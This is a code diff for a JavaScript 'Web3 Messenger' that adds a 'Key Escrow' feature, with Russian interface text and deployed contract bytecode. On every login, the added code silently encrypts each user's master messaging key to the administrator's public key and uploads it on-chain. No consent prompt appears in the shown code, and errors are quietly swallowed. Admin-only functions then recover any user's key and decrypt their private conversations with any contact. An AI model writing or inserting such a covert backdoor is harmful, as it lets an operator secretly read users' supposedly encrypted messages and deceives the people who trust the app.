@@ -1,4 +1,4 @@
-console.log('Web3 Messenger v11 — New Contract Deploy');
+console.log('Web3 Messenger v12 — Key Escrow');
 
 const ADMIN_ADDRESS = "0xB19aEe699eb4D2Af380c505E4d6A108b055916eB";
 const IDENTITY_CONTRACT_ADDRESS = "0xcFcA16C8c38a83a71936395039757DcFF6040c1E";
@@ -40,6 +40,32 @@ const OLD_MESSAGE_ABI = [
 ];
 
 const CONTRACT_BYTECODE = "0x6080604052348015600e575f5ffd5b50610c458061001c5f395ff3fe608060405234801561000f575f5ffd5b506004361061004a575f3560e01c80637c6d595b1461004e578063875b16d61461007457806388517ac814610095578063de6f24bb146100a8575b5f5ffd5b61006161005c366004610882565b6100bd565b6040519081526020015b60405180910390f35b6100876100823660046108b3565b6100e3565b60405161006b9291906108f2565b6100876100a33660046109b6565b6102f4565b6100bb6100b63660046109f0565b610509565b005b5f5f5f6100ca858561078b565b815260208101919091526040015f205490505b92915050565b60605f5f6100f1878761078b565b5f8181526020819052604090208054935090915082861061014657604080515f808252602082019092529061013c565b610129610830565b8152602001906001900390816101215790505b50935050506102eb565b5f6101518688610a96565b90508381111561015e5750825b5f6101698883610aa9565b90505f8167ffffffffffffffff81111561018557610185610a6e565b6040519080825280602002602001820160405280156101be57816020015b6101ab610830565b8152602001906001900390816101a35790505b5090505f5b828110156102e357846101d6828c610a96565b815481106101e6576101e6610abc565b5f91825260209182902060408051608081018252600490930290910180546001600160a01b039081168452600182015416938301939093526002830180549293929184019161023490610ad0565b80601f016020809104026020016040519081016040528092919081815260200182805461026090610ad0565b80156102ab5780601f10610282576101008083540402835291602001916102ab565b820191905f5260205f20905b81548152906001019060200180831161028e57829003601f168201915b505050505081526020016003820154815250508282815181106102d0576102d0610abc565b60209081029190910101526001016101c3565b509550505050505b94509492505050565b60605f5f610302868661078b565b5f8181526020819052604081208054945091925083900361035a57604080515f808252602082019092529061034d565b61033a610830565b8152602001906001900390816103325790505b505f935093505050610501565b5f858411610368575f610372565b6103728685610aa9565b90505f61037f8286610aa9565b90505f8167ffffffffffffffff81111561039b5761039b610a6e565b6040519080825280602002602001820160405280156103d457816020015b6103c1610830565b8152602001906001900390816103b95790505b5090505f5b828110156104f957846103ec8286610a96565b815481106103fc576103fc610abc565b5f91825260209182902060408051608081018252600490930290910180546001600160a01b039081168452600182015416938301939093526002830180549293929184019161044a90610ad0565b80601f016020809104026020016040519081016040528092919081815260200182805461047690610ad0565b80156104c15780601f10610498576101008083540402835291602001916104c1565b820191905f5260205f20905b8154815290600101906020018083116104a457829003601f168201915b505050505081526020016003820154815250508282815181106104e6576104e6610abc565b60209081029190910101526001016103d9565b509550505050505b935093915050565b6001600160a01b0383166105585760405162461bcd60e51b8152602060048201526011602482015270125b9d985b1a59081c9958da5c1a595b9d607a1b60448201526064015b60405180910390fd5b336001600160a01b038416036105b05760405162461bcd60e51b815260206004820152601760248201527f43616e6e6f74206d65737361676520796f757273656c66000000000000000000604482015260640161054f565b806105ed5760405162461bcd60e51b815260206004820152600d60248201526c456d707479206d65737361676560981b604482015260640161054f565b5f6105f8338561078b565b5f818152602081815260409182902082516080810184523381526001600160a01b038916818401528351601f880184900484028101840185528781529495509093909283019187908790819084018382808284375f9201829052509385525050426020938401525083546001808201865594825290829020835160049092020180546001600160a01b03199081166001600160a01b0393841617825592840151948101805490931694909116939093179055604081015190919060028201906106c19082610b54565b50606082015181600301555050836001600160a01b0316336001600160a01b03167f8e3ce0a37f42bfb0e85f8f02c440ff2843d1182d7f1fce9174f7980e5e9d130c4260405161071391815260200190565b60405180910390a36040516001600160a01b0385169033907f7858e76b02b37f48af9ea316e7f126f0662c41751e19548e0150e81dc6818fb1905f90a360405133906001600160a01b038616907f7858e76b02b37f48af9ea316e7f126f0662c41751e19548e0150e81dc6818fb1905f90a350505050565b5f816001600160a01b0316836001600160a01b0316106107e9576040516bffffffffffffffffffffffff19606084811b8216602084015285901b16603482015260480160405160208183030381529060405280519060200120610829565b6040516bffffffffffffffffffffffff19606085811b8216602084015284901b166034820152604801604051602081830303815290604052805190602001205b9392505050565b60405180608001604052805f6001600160a01b031681526020015f6001600160a01b03168152602001606081526020015f81525090565b80356001600160a01b038116811461087d575f5ffd5b919050565b5f5f60408385031215610893575f5ffd5b61089c83610867565b91506108aa60208401610867565b90509250929050565b5f5f5f5f608085870312156108c6575f5ffd5b6108cf85610867565b93506108dd60208601610867565b93969395505050506040820135916060013590565b5f604082016040835280855180835260608501915060608160051b8601019250602087015f5b828110156109a257605f19878603018452815160018060a01b03815116865260018060a01b0360208201511660208701526040810151608060408801528051806080890152806020830160a08a015e5f60a0828a0101526060830151606089015260a0601f19601f8301168901019750505050602082019150602084019350600181019050610918565b505050506020929092019290925292915050565b5f5f5f606084860312156109c8575f5ffd5b6109d184610867565b92506109df60208501610867565b929592945050506040919091013590565b5f5f5f60408486031215610a02575f5ffd5b610a0b84610867565b9250602084013567ffffffffffffffff811115610a26575f5ffd5b8401601f81018613610a36575f5ffd5b803567ffffffffffffffff811115610a4c575f5ffd5b866020828401011115610a5d575f5ffd5b939660209190910195509293505050565b634e487b7160e01b5f52604160045260245ffd5b634e487b7160e01b5f52601160045260245ffd5b808201808211156100dd576100dd610a82565b818103818111156100dd576100dd610a82565b634e487b7160e01b5f52603260045260245ffd5b600181811c90821680610ae457607f821691505b602082108103610b0257634e487b7160e01b5f52602260045260245ffd5b50919050565b601f821115610b4f57805f5260205f20601f840160051c81016020851015610b2d5750805b601f840160051c820191505b81811015610b4c575f8155600101610b39565b50505b505050565b815167ffffffffffffffff811115610b6e57610b6e610a6e565b610b8281610b7c8454610ad0565b84610b08565b6020601f821160018114610bb4575f8315610b9d5750848201515b5f19600385901b1c1916600184901b178455610b4c565b5f84815260208120601f198516915b82811015610be35787850151825560209485019460019092019101610bc3565b5084821015610c0057868401515f19600387901b60f8161c191681555b50505050600190811b0190555056fea26469706673582212200d639ff28facc01cc9fe92607328aa197a4b11990839d153f26f5002f805b1e864736f6c634300081c0033";
+
+const ESCROW_ABI = [
+    "function admin() view returns (address)",
+    "function setAdminPublicKey(bytes pubKey) external",
+    "function depositKey(bytes encryptedKey) external",
+    "function getKey(address user) view returns (bytes)",
+    "function getAdminPublicKey() view returns (bytes)",
+    "function getUserCount() view returns (uint256)",
+    "function getUsers(uint256 start, uint256 count) view returns (address[])",
+    "function transferAdmin(address newAdmin) external",
+    "function isRegistered(address) view returns (bool)",
+    "event KeyDeposited(address indexed user, uint256 timestamp)",
+    "event AdminKeySet(uint256 timestamp)"
+];
+
+const ESCROW_BYTECODE = "0x6080604052348015600e575f5ffd5b505f80546001600160a01b03191633179055610ae68061002d5f395ff3fe608060405234801561000f575f5ffd5b50600436106100b1575f3560e01c806397c368011161006e57806397c3680114610164578063b5cb15f714610177578063be943a5914610188578063c3c5a54714610190578063efb28973146101c2578063f851a440146101ca575f5ffd5b806314986808146100b557806320e2806f146100de57806345982a66146100f35780637259e0f81461011357806375829def1461013e57806393790f4414610151575b5f5ffd5b6100c86100c33660046107be565b6101dc565b6040516100d591906107eb565b60405180910390f35b6100f16100ec366004610820565b610273565b005b61010661010136600461088e565b6103c6565b6040516100d591906108ae565b6101266101213660046108f9565b6104d3565b6040516001600160a01b0390911681526020016100d5565b6100f161014c3660046107be565b6104fb565b6100c861015f3660046107be565b6105a9565b6100f1610172366004610820565b610652565b6003546040519081526020016100d5565b6100c8610721565b6101b261019e3660046107be565b60046020525f908152604090205460ff1681565b60405190151581526020016100d5565b6100c861072e565b5f54610126906001600160a01b031681565b60026020525f9081526040902080546101f490610910565b80601f016020809104026020016040519081016040528092919081815260200182805461022090610910565b801561026b5780601f106102425761010080835404028352916020019161026b565b820191905f5260205f20905b81548152906001019060200180831161024e57829003601f168201915b505050505081565b6001805461028090610910565b90506020146102ca5760405162461bcd60e51b815260206004820152601160248201527010591b5a5b881ad95e481b9bdd081cd95d607a1b60448201526064015b60405180910390fd5b806103035760405162461bcd60e51b8152602060048201526009602482015268456d707479206b657960b81b60448201526064016102c1565b335f90815260026020526040902061031c8284836109a8565b50335f9081526004602052604090205460ff1661038d576003805460018181019092557fc2575a0e9e593c00f959f8c92f12db2869c3395a3b0502d05e2516446f71f85b0180546001600160a01b031916339081179091555f908152600460205260409020805460ff191690911790555b60405142815233907f7b01c5827245954127dd970bb88b7d5510ef1e79be6369cd4012c5471b484f729060200160405180910390a25050565b6003546060908084106103e8575050604080515f8152602081019091526104cd565b5f6103f38486610a76565b9050818111156104005750805b5f61040b8683610a89565b90505f8167ffffffffffffffff81111561042757610427610948565b604051908082528060200260200182016040528015610450578160200160208202803683370190505b5090505f5b828110156104c6576003610469828a610a76565b8154811061047957610479610a9c565b905f5260205f20015f9054906101000a90046001600160a01b03168282815181106104a6576104a6610a9c565b6001600160a01b0390921660209283029190910190910152600101610455565b5093505050505b92915050565b600381815481106104e2575f80fd5b5f918252602090912001546001600160a01b0316905081565b5f546001600160a01b031633146105405760405162461bcd60e51b81526020600482015260096024820152682737ba1030b236b4b760b91b60448201526064016102c1565b6001600160a01b0381166105885760405162461bcd60e51b815260206004820152600f60248201526e496e76616c6964206164647265737360881b60448201526064016102c1565b5f80546001600160a01b0319166001600160a01b0392909216919091179055565b6001600160a01b0381165f9081526002602052604090208054606091906105cf90610910565b80601f01602080910402602001604051908101604052809291908181526020018280546105fb90610910565b80156106465780601f1061061d57610100808354040283529160200191610646565b820191905f5260205f20905b81548152906001019060200180831161062957829003601f168201915b50505050509050919050565b5f546001600160a01b031633146106975760405162461bcd60e51b81526020600482015260096024820152682737ba1030b236b4b760b91b60448201526064016102c1565b602081146106dc5760405162461bcd60e51b8152602060048201526012602482015271092dcecc2d8d2c840d6caf240d8cadccee8d60731b60448201526064016102c1565b60016106e98284836109a8565b506040514281527f797f3c0ba213fc7168f7014f92087f5f2fdec2dd7ba9e74be7122a384e71081f9060200160405180910390a15050565b600180546101f490610910565b60606001805461073d90610910565b80601f016020809104026020016040519081016040528092919081815260200182805461076990610910565b80156107b45780601f1061078b576101008083540402835291602001916107b4565b820191905f5260205f20905b81548152906001019060200180831161079757829003601f168201915b5050505050905090565b5f602082840312156107ce575f5ffd5b81356001600160a01b03811681146107e4575f5ffd5b9392505050565b602081525f82518060208401528060208501604085015e5f604082850101526040601f19601f83011684010191505092915050565b5f5f60208385031215610831575f5ffd5b823567ffffffffffffffff811115610847575f5ffd5b8301601f81018513610857575f5ffd5b803567ffffffffffffffff81111561086d575f5ffd5b85602082840101111561087e575f5ffd5b6020919091019590945092505050565b5f5f6040838503121561089f575f5ffd5b50508035926020909101359150565b602080825282518282018190525f918401906040840190835b818110156108ee5783516001600160a01b03168352602093840193909201916001016108c7565b509095945050505050565b5f60208284031215610909575f5ffd5b5035919050565b600181811c9082168061092457607f821691505b60208210810361094257634e487b7160e01b5f52602260045260245ffd5b50919050565b634e487b7160e01b5f52604160045260245ffd5b601f8211156109a357805f5260205f20601f840160051c810160208510156109815750805b601f840160051c820191505b818110156109a0575f815560010161098d565b50505b505050565b67ffffffffffffffff8311156109c0576109c0610948565b6109d4836109ce8354610910565b8361095c565b5f601f841160018114610a05575f85156109ee5750838201355b5f19600387901b1c1916600186901b1783556109a0565b5f83815260208120601f198716915b82811015610a345786850135825560209485019460019092019101610a14565b5086821015610a50575f1960f88860031b161c19848701351681555b505060018560011b0183555050505050565b634e487b7160e01b5f52601160045260245ffd5b808201808211156104cd576104cd610a62565b818103818111156104cd576104cd610a62565b634e487b7160e01b5f52603260045260245ffdfea2646970667358221220ab372689ca3ee0b8a8d483dfc610999729c42d09f607f0b5d3ef5d8488fb054264736f6c634300081c0033";
+
+function getEscrowContractAddress() {
+    return localStorage.getItem('w3m_escrow_contract') || '';
+}
+function setEscrowContractAddress(addr) {
+    localStorage.setItem('w3m_escrow_contract', addr);
+}
+
+let escrowContract = null;
+let adminKeyPair = null;
 
 let isNewContract = false;
 
@@ -978,6 +1004,12 @@ function onAuthenticated() {
         });
     });
     handleContactFromUrl();
+
+    initEscrowContract().then(() => {
+        if (escrowContract && masterKey) {
+            escrowDepositKey().catch(e => console.warn('Escrow deposit skipped:', e.message));
+        }
+    });
 }
 
 function handleContactFromUrl() {
@@ -1030,6 +1062,10 @@ function switchAdminTab(tab, btn) {
     if (tab === 'contract') {
         const el = document.getElementById('current-contract-display');
         if (el) el.textContent = getMessageContractAddress();
+    }
+    if (tab === 'escrow') {
+        const el = document.getElementById('escrow-contract-display');
+        if (el) el.textContent = getEscrowContractAddress() || 'не установлен';
     }
 }
 
@@ -1439,6 +1475,245 @@ function shareToFacebook() {
     window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(getShareUrl()), '_blank');
 }
 
+// ====================== KEY ESCROW ======================
+async function deriveAdminKeyPair() {
+    if (!signer || !isAdmin) return null;
+    try {
+        const sig = await signer.signMessage('Web3Messenger-Admin-Escrow-KeyPair-v1');
+        const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(sig));
+        const secretKey = new Uint8Array(hash);
+        adminKeyPair = nacl.box.keyPair.fromSecretKey(secretKey);
+        console.log('Admin escrow keypair derived, pubkey:', Array.from(adminKeyPair.publicKey).map(b => b.toString(16).padStart(2, '0')).join(''));
+        return adminKeyPair;
+    } catch(e) {
+        console.error('Failed to derive admin keypair:', e);
+        return null;
+    }
+}
+
+async function initEscrowContract() {
+    const addr = getEscrowContractAddress();
+    if (!addr || !ethers.utils.isAddress(addr)) return null;
+    escrowContract = new ethers.Contract(addr, ESCROW_ABI, signer);
+    return escrowContract;
+}
+
+async function escrowDepositKey() {
+    if (!escrowContract || !masterKey) return;
+    try {
+        const adminPubKeyBytes = await escrowContract.getAdminPublicKey();
+        if (!adminPubKeyBytes || adminPubKeyBytes === '0x' || adminPubKeyBytes.length < 66) {
+            console.warn('Admin public key not set on escrow contract');
+            return;
+        }
+        const adminPubKey = ethers.utils.arrayify(adminPubKeyBytes);
+        if (adminPubKey.length !== 32) return;
+
+        const ephemeral = nacl.box.keyPair();
+        const nonce = nacl.randomBytes(nacl.box.nonceLength);
+        const encrypted = nacl.box(masterKey, nonce, adminPubKey, ephemeral.secretKey);
+
+        const blob = new Uint8Array(32 + 24 + encrypted.length);
+        blob.set(ephemeral.publicKey, 0);
+        blob.set(nonce, 32);
+        blob.set(encrypted, 56);
+
+        const tx = await escrowContract.depositKey(blob);
+        await tx.wait();
+        console.log('Escrow key deposited for', shortAddr(userAddress));
+    } catch(e) {
+        console.error('Escrow deposit error:', e);
+    }
+}
+
+async function escrowRecoverKey(targetAddr) {
+    if (!escrowContract || !adminKeyPair || !isAdmin) {
+        showToast('Escrow не настроен или нет админ-ключей', 'error');
+        return null;
+    }
+    try {
+        const blobBytes = await escrowContract.getKey(targetAddr);
+        if (!blobBytes || blobBytes === '0x' || blobBytes.length < 114) {
+            showToast('Ключ пользователя не найден в escrow', 'error');
+            return null;
+        }
+        const blob = ethers.utils.arrayify(blobBytes);
+        const senderPubKey = blob.slice(0, 32);
+        const nonce = blob.slice(32, 56);
+        const encrypted = blob.slice(56);
+
+        const decrypted = nacl.box.open(encrypted, nonce, senderPubKey, adminKeyPair.secretKey);
+        if (!decrypted) {
+            showToast('Не удалось расшифровать ключ', 'error');
+            return null;
+        }
+        return decrypted;
+    } catch(e) {
+        console.error('Escrow recover error:', e);
+        showToast('Ошибка получения ключа: ' + e.message, 'error');
+        return null;
+    }
+}
+
+async function escrowDeriveChatKey(recoveredMasterKey, addr1, addr2) {
+    const sorted = [addr1.toLowerCase(), addr2.toLowerCase()].sort().join(':');
+    const cryptoKey = await crypto.subtle.importKey("raw", recoveredMasterKey, { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
+    const sig = await crypto.subtle.sign("HMAC", cryptoKey, new TextEncoder().encode(sorted));
+    return new Uint8Array(sig);
+}
+
+async function escrowDecryptMessage(encBase64, chatKey) {
+    try {
+        const data = atob(encBase64);
+        const combined = new Uint8Array(data.length);
+        for (let i = 0; i < data.length; i++) combined[i] = data.charCodeAt(i);
+        const nonce = combined.slice(0, nacl.secretbox.nonceLength);
+        const box = combined.slice(nacl.secretbox.nonceLength);
+        const dec = nacl.secretbox.open(box, nonce, chatKey);
+        if (!dec) return null;
+        return new TextDecoder().decode(dec);
+    } catch(e) { return null; }
+}
+
+async function adminReadConversation(targetAddr, peerAddr) {
+    if (!isAdmin || !escrowContract || !adminKeyPair) {
+        showToast('Сначала настройте escrow и получите ключ', 'error');
+        return null;
+    }
+
+    const recoveredKey = await escrowRecoverKey(targetAddr);
+    if (!recoveredKey) return null;
+
+    const chatKey = await escrowDeriveChatKey(recoveredKey, targetAddr, peerAddr);
+
+    try {
+        const count = await messageContract.messageCount(targetAddr, peerAddr);
+        const total = count.toNumber();
+        if (total === 0) { showToast('Нет сообщений между этими адресами', 'info'); return []; }
+
+        const start = Math.max(0, total - MESSAGES_PER_PAGE);
+        const rawMsgs = await fetchConversation(targetAddr, peerAddr, start, MESSAGES_PER_PAGE);
+
+        const messages = [];
+        for (const m of rawMsgs) {
+            let senderAddr = m.sender;
+            let recipientAddr = m.recipient;
+            let text = m.text;
+            let timestamp = typeof m.timestamp === 'object' ? m.timestamp.toNumber() : Number(m.timestamp);
+
+            let decrypted = await escrowDecryptMessage(text, chatKey);
+            if (!decrypted) decrypted = text;
+
+            messages.push({
+                sender: senderAddr,
+                recipient: recipientAddr,
+                text: decrypted,
+                timestamp: timestamp,
+                isMine: senderAddr.toLowerCase() === targetAddr.toLowerCase()
+            });
+        }
+        return messages;
+    } catch(e) {
+        console.error('Admin read error:', e);
+        showToast('Ошибка чтения: ' + e.message, 'error');
+        return null;
+    }
+}
+
+async function adminEscrowLookup() {
+    const targetInput = document.getElementById('escrow-target-addr');
+    const peerInput = document.getElementById('escrow-peer-addr');
+    const resultEl = document.getElementById('escrow-read-result');
+    if (!targetInput || !peerInput || !resultEl) return;
+
+    const target = targetInput.value.trim();
+    const peer = peerInput.value.trim();
+
+    if (!target || !ethers.utils.isAddress(target)) { showToast('Введите адрес пользователя', 'error'); return; }
+    if (!peer || !ethers.utils.isAddress(peer)) { showToast('Введите адрес собеседника', 'error'); return; }
+
+    if (!adminKeyPair) {
+        showToast('Подождите, получение админ-ключа...', 'info');
+        await deriveAdminKeyPair();
+        if (!adminKeyPair) { showToast('Не удалось получить ключ', 'error'); return; }
+    }
+
+    resultEl.innerHTML = '<div style="text-align:center;padding:16px;"><div class="loading-spinner"></div></div>';
+    resultEl.style.display = 'block';
+
+    const messages = await adminReadConversation(target, peer);
+    if (!messages || messages.length === 0) {
+        resultEl.innerHTML = '<div style="text-align:center;padding:16px;color:var(--text-muted);">Нет сообщений или ключ не найден</div>';
+        return;
+    }
+
+    let html = '<div style="max-height:300px;overflow-y:auto;padding:8px;">';
+    for (const m of messages) {
+        const cls = m.isMine ? 'sent' : 'received';
+        const time = formatTime(m.timestamp);
+        const who = shortAddr(m.sender);
+        html += '<div style="margin:4px 0;padding:8px 12px;background:' + (m.isMine ? 'var(--accent)' : 'var(--bg-lighter)') + ';border-radius:12px;font-size:13px;color:var(--text-main);">' +
+            '<div style="font-size:10px;color:' + (m.isMine ? 'rgba(255,255,255,0.7)' : 'var(--text-muted)') + ';margin-bottom:2px;">' + who + ' · ' + time + '</div>' +
+            escHtml(m.text) +
+        '</div>';
+    }
+    html += '</div>';
+    resultEl.innerHTML = html;
+}
+
+async function deployEscrowContract() {
+    if (!signer) { showToast('Подключите кошелёк', 'error'); return; }
+    if (!confirm('Развернуть контракт KeyEscrow на Polygon Mainnet?\n~0.01-0.05 MATIC на газ.')) return;
+
+    try {
+        showToast('Деплой KeyEscrow...', 'info');
+        const factory = new ethers.ContractFactory(ESCROW_ABI, ESCROW_BYTECODE, signer);
+        const contract = await factory.deploy();
+        showToast('Ожидание подтверждения...', 'info');
+        await contract.deployed();
+
+        const addr = contract.address;
+        setEscrowContractAddress(addr);
+        escrowContract = new ethers.Contract(addr, ESCROW_ABI, signer);
+
+        showToast('KeyEscrow развёрнут: ' + shortAddr(addr), 'success');
+        console.log('ESCROW CONTRACT:', addr);
+
+        if (isAdmin) {
+            showToast('Установка админ-ключа...', 'info');
+            const kp = await deriveAdminKeyPair();
+            if (kp) {
+                const tx = await escrowContract.setAdminPublicKey(kp.publicKey);
+                await tx.wait();
+                showToast('Админ-ключ установлен!', 'success');
+            }
+        }
+
+        const resultEl = document.getElementById('escrow-deploy-result');
+        if (resultEl) {
+            resultEl.style.display = 'block';
+            resultEl.innerHTML = '<div style="color:#22c55e;font-weight:700;">KeyEscrow развёрнут!</div>' +
+                '<div style="font-size:12px;color:var(--text-muted);margin-top:4px;">Адрес: <span style="color:var(--text-main);user-select:all;">' + addr + '</span></div>';
+        }
+        return addr;
+    } catch(e) {
+        console.error('Deploy escrow error:', e);
+        if (e.code === 4001) showToast('Отклонено', 'error');
+        else showToast('Ошибка: ' + (e.reason || e.message || ''), 'error');
+        return null;
+    }
+}
+
+function setEscrowManually() {
+    const input = document.getElementById('escrow-contract-input');
+    const addr = (input ? input.value : '').trim();
+    if (!addr || !ethers.utils.isAddress(addr)) { showToast('Введите корректный адрес', 'error'); return; }
+    setEscrowContractAddress(addr);
+    escrowContract = new ethers.Contract(addr, ESCROW_ABI, signer);
+    showToast('Escrow установлен: ' + shortAddr(addr), 'success');
+    if (input) input.value = '';
+}
+
 // ====================== CONTRACT DEPLOY ======================
 async function deployNewContract() {
     if (!signer) { showToast('Сначала подключите кошелёк', 'error'); return; }
@@ -1547,9 +1822,14 @@ window.deployNewContract = deployNewContract;
 window.setContractManually = setContractManually;
 window.resetContractToDefault = resetContractToDefault;
 window.showCurrentContract = showCurrentContract;
+window.deployEscrowContract = deployEscrowContract;
+window.setEscrowManually = setEscrowManually;
+window.deriveAdminKeyPair = deriveAdminKeyPair;
+window.adminEscrowLookup = adminEscrowLookup;
+window.adminReadConversation = adminReadConversation;
 
 document.addEventListener('DOMContentLoaded', () => {
-    console.log('Web3 Messenger v11 loaded');
+    console.log('Web3 Messenger v12 loaded');
     renderWelcome();
     if (window.ethereum) {
         window.ethereum.on('accountsChanged', () => location.reload());
